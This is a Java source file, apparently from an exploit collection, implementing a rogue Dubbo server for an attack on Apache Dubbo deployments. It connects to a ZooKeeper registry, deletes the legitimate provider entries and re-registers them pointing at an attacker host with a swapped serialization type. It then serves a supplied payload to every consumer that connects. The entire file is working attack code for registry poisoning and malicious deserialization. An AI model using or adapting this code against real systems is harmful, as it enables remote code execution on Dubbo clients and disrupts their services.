package com.threedr3am.bug.dubbo.rouge;

import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.curator.framework.CuratorFramework;
import org.apache.curator.framework.CuratorFrameworkFactory;
import org.apache.curator.retry.RetryNTimes;
import org.apache.zookeeper.CreateMode;

/**
 * @author threedr3am
 */
public class RougeBase {

  public String getType() {
    return null;
  }

  public void startRougeServer(String zookeeperUri, String rougeHost, int rougePort, byte[] bytes,
      boolean attackRegister)
      throws Exception {
    CuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder()
        .connectString(zookeeperUri)
        .retryPolicy(new RetryNTimes(1, 1000))
        .connectionTimeoutMs(3000)
        .sessionTimeoutMs(600000);
    CuratorFramework client = builder.build();
    client.start();

    if (attackRegister) {
      Map<String, String> data = new HashMap<>();
      String unique = "/";
      initData(data, unique, client);
      attackRegister(client, data, "dubbo://" + rougeHost + ":" + rougePort + "/");
    }
    ServerSocket serverSocket = new ServerSocket(rougePort);
    while (true) {
      Socket socket = serverSocket.accept();
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(bytes);
      outputStream.flush();
      outputStream.close();
    }
  }

  private void attackRegister(CuratorFramework client,
      Map<String, String> data, String rougeUri) {
    data.entrySet().forEach(d -> {
      String pathParent = d.getKey();
      String path = d.getValue();
      try {
        client.delete().forPath(pathParent + "/" + path);
      } catch (Exception e) {
        e.printStackTrace();
      }
      String pathForDecode = URLDecoder.decode(path);
      pathForDecode = pathForDecode.replaceAll("dubbo://.+?/", rougeUri);
      pathForDecode = pathForDecode.replaceAll("serialization=.+?&", "");
      pathForDecode = pathForDecode + (pathForDecode.endsWith("&") ? "" : "&") + "serialization=" + getType();
      String rougePathForEncode = URLEncoder
          .encode(pathForDecode);
      try {
        client.create().withMode(CreateMode.EPHEMERAL).forPath(pathParent + "/" +rougePathForEncode);
      } catch (Exception e) {
        e.printStackTrace();
      }
    });
  }

  private void initData(Map<String, String> data, String unique,
      CuratorFramework client) throws Exception {
    List<String> all = client.getChildren().forPath(unique);
    for (String i : all) {
      String uniqueChildren = unique + (unique.length() != 1 ? "/" : "") + i;
      if (i.equals("providers")) {
        makeData(data, uniqueChildren, client);
        continue;
      }
      initData(data, uniqueChildren, client);
    }
  }

  private void makeData(Map<String, String> data, String provider, CuratorFramework client) throws Exception {
    List<String> all = client.getChildren().forPath(provider);
    if (all.size() > 0) {
      data.put(provider, all.get(0));
    }
  }
}
